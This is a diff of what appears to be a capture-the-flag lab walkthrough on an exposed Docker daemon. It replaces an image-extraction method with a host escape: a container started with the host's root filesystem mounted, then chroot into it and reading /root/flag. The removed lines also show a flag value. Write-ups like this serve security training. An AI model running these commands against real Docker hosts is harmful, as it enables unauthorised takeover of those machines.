@@ -43,24 +43,28 @@ export DOCKER_HOST="tcp://localhost:2375"
 docker images
 ```
 
-#### 5. Extract image
+#### 5. Start an Ubuntu container. Mount root filesystem of host machine on /host directory of the container.
 
-```
-root@attackdefense:~# mkdir image
-root@attackdefense:~# mv *.tar image
-root@attackdefense:~# cd image/
-root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done
-root@attackdefense:~/image# ls
-1.tar  2.tar  3.tar  bin  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
-root@attackdefense:~/image#
+```bash
+docker run -it -v /:/host/ ubuntu:18.04 bash
 ```
 
-#### 6. Find the flag
+#### 6. Change to /host directory and list the files.  
 
+```bash
+cd /host/
+ls -l
 ```
-root@attackdefense:~/image# find . -name *flag* 2> /dev/null
-./etc/network/if-post-up.d/flag.txt
-root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt
-c09f6e2ecff56dcae50c02c6a4d355fe
-root@attackdefense:~/image#
+
+#### 7. Use chroot on the /host directory.  
+
+```bash
+chroot ./ bash
+```
+
+#### 8. Retrieve the flag.  
+
+```bash
+find / -name flag 2>/dev/null
+cat /root/flag
 ```
